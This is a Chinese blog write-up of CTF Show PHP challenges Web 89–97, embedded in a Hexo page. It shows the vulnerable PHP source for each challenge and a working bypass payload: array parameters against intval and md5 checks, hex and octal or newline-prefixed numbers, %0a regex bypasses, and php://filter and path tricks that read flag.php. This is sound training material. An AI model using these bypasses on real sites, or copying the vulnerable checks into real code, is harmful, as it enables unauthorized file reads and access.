<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>ctf-show-php特性 | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="CTF" />
  
  
  
  
  <meta name="description" content="CTF Show PHP 特性篇。">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-Show-PHP特性">
<meta property="og:url" content="https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="CTF Show PHP 特性篇。">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/M8ypxAwW7jNsoP6.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/GTRs27cIVn3MmHB.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/xAJrKWGiBOjhmTu.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/WCA6wXcS4Bxt89l.png">
<meta property="og:image" content="https://i.loli.net/2021/07/18/V4pOyTZECmWY2B7.png">
<meta property="og:image" content="https://i.loli.net/2021/07/18/YGmoRLev1xTq5Wz.png">
<meta property="og:image" content="https://i.loli.net/2021/07/18/54Y8EOvFWDByebl.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/lk3Cv7n8eOghUxq.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/jsdzfwvOeMl69aU.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/DmW7bvf2sIPgEi3.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/ryjIeQWb8ZNisG4.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/58yCAMVZ7b1dK9N.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/VJki8tAr4S25wo1.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/qVudQDK9zj1y8iP.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/y2R1eQ6kUjBhsAw.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/gzAUSiO4LIex8pJ.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/pji4IDPfbUcwMG6.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/w3FPDeNUHBTigRu.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/xq3CMlAumonI9ZU.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/4sFSywvTBbjpfLm.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/RX2Dwak1VZC8neG.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/wKxFbDq7QmNTdVX.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/qmGe4jI7o8gZtbd.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/oTXGpwmtyYqZ3rQ.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/kigqxcs5PmtvYQa.png">
<meta property="og:image" content="https://i.loli.net/2021/08/08/amteA8lZkHP7svn.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/HYKx5rCNQElveW3.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/Z7J62hxmCTvAteF.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/KYJ9kCDABHOGc6i.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/2pMsh8HFcSCoezb.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/pdDAr1YcaRwMWsI.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/l87FYHj2x4WBC13.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/G7B1UmwbYlqMVar.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/iMTXdeNtrVFQKcW.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/3nXbdCi6fSDqg1p.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/Rftu7sEcSJiKqbM.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/6HVGre1oWQunET9.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/8RlGgSM6mD7PArW.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/UsBeVuF4M6XJv7j.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/vNDO6bQoxqiZwmL.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/q21uFEU9YCBRcQ3.png">
<meta property="article:published_time" content="2021-10-01T11:15:08.000Z">
<meta property="article:modified_time" content="2021-10-01T11:16:09.641Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
                
                  <li> <a class="main-nav-link" href="/friendly-links">友情链接</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-CTF-Show-PHP特性" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      CTF-Show-PHP特性
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/" class="article-date">
	  <time datetime="2021-10-01T11:15:08.000Z" itemprop="datePublished">2021-10-01</time>
	</a>

      
    <a class="article-category-link" href="/categories/CTF-Show/">CTF Show</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>CTF Show PHP 特性篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-PHP特性"><a href="#一、CTF-Show-PHP特性" class="headerlink" title="一、CTF Show PHP特性"></a>一、CTF Show PHP特性</h1><h2 id="1-1-Web-89-—-intval-数组-绕过"><a href="#1-1-Web-89-—-intval-数组-绕过" class="headerlink" title="1.1 Web 89 — intval 数组 [ ] 绕过"></a>1.1 Web 89 — intval 数组 [ ] 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1		<span class="comment">#数组绕过</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476"><a href="#1-2-Web-90-—-intval-取整-—-intval-‘4476sasaS’-0-4476" class="headerlink" title="1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476"></a>1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===4476</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed <span class="variable">$var</span> [, int <span class="variable">$base</span> = 10 ] ) : int</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 0，通过检测 var 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 16 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 8 进制(octal)；</span><br><span class="line">否则，</span><br><span class="line">将使用 10 进制 (decimal)。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="string">&#x27;4476.0&#x27;</span>)===4476    小数点  </span><br><span class="line">intval(<span class="string">&#x27;+4476.0&#x27;</span>)===4476   正负号</span><br><span class="line">intval(<span class="string">&#x27;4476e0&#x27;</span>)===4476    科学计数法</span><br><span class="line">intval(<span class="string">&#x27;0x117c&#x27;</span>)===4476    16进制</span><br><span class="line">intval(<span class="string">&#x27;010574&#x27;</span>)===4476    8进制</span><br><span class="line">intval(<span class="string">&#x27; 010574&#x27;</span>)===4476   8进制+空格</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="string">&#x27;4476sasaS&#x27;</span>,0)===4476)&#123;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476asd</span><br></pre></td></tr></table></figure>

<h2 id="1-3-Web-91-—-正则绕过-—-m-换行匹配"><a href="#1-3-Web-91-—-正则绕过-—-m-换行匹配" class="headerlink" title="1.3 Web 91 — 正则绕过 — /m 换行匹配"></a>1.3 Web 91 — 正则绕过 — /m 换行匹配</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Notice: Undefined index: cmd in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line">nonononono</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解析换行之后要匹配到 php不换行不能匹配到 php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i 不区分(ignore)大小写m多(more)行匹配若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配<span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;preg_match(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;<span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;preg_match_all(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);这样匹配到的有三个 <span class="built_in">bg</span> b\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-Web-92-—-intval-可解析十六进制、八进制"><a href="#1-4-Web-92-—-intval-可解析十六进制、八进制" class="headerlink" title="1.4 Web 92 — intval 可解析十六进制、八进制"></a>1.4 Web 92 — intval 可解析十六进制、八进制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c	<span class="comment">#十六进制 Hex?num=010574	#八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-Web-93-—-八进制不含字母，十六进制含字母"><a href="#1-5-Web-93-—-八进制不含字母，十六进制含字母" class="headerlink" title="1.5 Web 93 — 八进制不含字母，十六进制含字母"></a>1.5 Web 93 — 八进制不含字母，十六进制含字母</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574	<span class="comment">#oct</span></span><br></pre></td></tr></table></figure>

<h2 id="1-6-Web-94-—-正则绕过-—-20-0a"><a href="#1-6-Web-94-—-正则绕过-—-20-0a" class="headerlink" title="1.6 Web 94 — 正则绕过 — %20  %0a"></a>1.6 Web 94 — 正则绕过 — <code>%20  %0a</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574</span></span><br></pre></td></tr></table></figure>

<h2 id="1-7-Web-95-—-正则绕过"><a href="#1-7-Web-95-—-正则绕过" class="headerlink" title="1.7 Web 95 — 正则绕过"></a>1.7 Web 95 — 正则绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);    &#125;    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);    &#125;    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);    &#125;    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0a010574?num=%20010574?num=+010574</span><br></pre></td></tr></table></figure>

<h2 id="1-8-Web-96-—-路径书写"><a href="#1-8-Web-96-—-路径书写" class="headerlink" title="1.8 Web 96 — 路径书写"></a>1.8 Web 96 — 路径书写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);    &#125;<span class="keyword">else</span>&#123;        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);    &#125;&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php			<span class="comment">#路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39"><a href="#1-9-Web-97-—-md5-数组-绕过-—-if-POST-39-a-39-POST-39-b-39-amp-amp-md5-POST-39-a-39-md5-POST-39-b-39" class="headerlink" title="1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))"></a>1.9 Web 97 — md5 数组 [ ] 绕过 — <code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))<span class="keyword">echo</span> <span class="variable">$flag</span>;elseprint <span class="string">&#x27;Wrong.&#x27;</span>;&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>

